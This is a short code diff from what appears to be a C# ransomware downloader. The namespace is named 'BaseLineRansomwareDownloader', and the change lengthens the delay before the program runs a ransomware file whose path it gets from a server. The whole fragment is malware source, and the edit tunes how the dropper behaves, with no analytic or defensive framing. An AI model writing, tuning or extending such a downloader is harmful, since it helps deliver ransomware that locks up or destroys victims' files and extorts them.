@@ -38,7 +38,7 @@ namespace BaseLineRansomwareDownloader
 
             serverCommunicator.postBaseFetched();
 
-            Thread.Sleep(60000);
+            Thread.Sleep(120000);
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
